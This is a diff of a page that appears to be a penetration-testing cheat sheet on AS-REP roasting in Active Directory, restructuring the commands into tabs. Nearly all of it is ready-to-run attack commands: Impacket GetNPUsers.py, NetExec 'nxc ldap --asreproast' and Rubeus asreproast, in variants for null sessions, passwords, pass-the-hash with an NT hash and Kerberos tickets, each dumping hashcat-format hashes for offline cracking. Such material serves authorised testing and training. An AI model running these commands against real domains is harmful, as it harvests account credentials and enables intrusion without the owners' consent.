@@ -58,16 +58,47 @@ nxc ldap $DC_IP -u '' -p '' -d $DOMAIN --dns-server $DC_IP --asreproast hashes.t
 
 Get the AS-REP blob and save it for offline cracking. Works with or without valid credentials.
 
-```bash wrap
-# Without credentials: requires a username list
-GetNPUsers.py $DOMAIN/ -dc-ip $DC_IP -no-pass -usersfile users.txt -format hashcat -outputfile hashes.txt
+<Tabs>
+  <Tab title="No Creds (username list)">
+    ```bash wrap
+    GetNPUsers.py $DOMAIN/ -dc-ip $DC_IP -no-pass \
+      -usersfile users.txt -format hashcat -outputfile hashes.txt
 
-# With credentials: discovers accounts automatically
-GetNPUsers.py $DOMAIN/$USER:$PASSWORD -dc-ip $DC_IP -request -format hashcat -outputfile hashes.txt
+    # nxc — null session
+    nxc ldap $DC_IP -u '' -p '' -d $DOMAIN --dns-server $DC_IP --asreproast hashes.txt
+    ```
+  </Tab>
+  <Tab title="Password">
+    ```bash wrap
+    # Auto-discovers AS-REP roastable accounts
+    GetNPUsers.py $DOMAIN/$USER:$PASSWORD -dc-ip $DC_IP \
+      -request -format hashcat -outputfile hashes.txt
 
-# Request for a specific account
-GetNPUsers.py $DOMAIN/ -dc-ip $DC_IP -no-pass -usersfile single_user.txt -format hashcat
-```
+    nxc ldap $DC_IP -u $USER -p $PASSWORD -d $DOMAIN --dns-server $DC_IP --asreproast hashes.txt
+    ```
+  </Tab>
+  <Tab title="NT Hash">
+    ```bash wrap
+    GetNPUsers.py $DOMAIN/$USER -hashes :$NTHASH -dc-ip $DC_IP \
+      -request -format hashcat -outputfile hashes.txt
+
+    nxc ldap $DC_IP -u $USER -H $NTHASH -d $DOMAIN --dns-server $DC_IP --asreproast hashes.txt
+    ```
+  </Tab>
+  <Tab title="Kerberos">
+    ```bash wrap
+    export KRB5CCNAME=/tmp/ticket.ccache
+    GetNPUsers.py $DOMAIN/$USER -k -no-pass -dc-ip $DC_IP \
+      -request -format hashcat -outputfile hashes.txt
+    ```
+  </Tab>
+  <Tab title="Windows (Rubeus)">
+    ```powershell wrap
+    Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt
+    Rubeus.exe asreproast /user:$TARGET /format:hashcat /outfile:hashes.txt
+    ```
+  </Tab>
+</Tabs>
 
 ```powershell wrap
 # Rubeus: all AS-REP roastable accounts
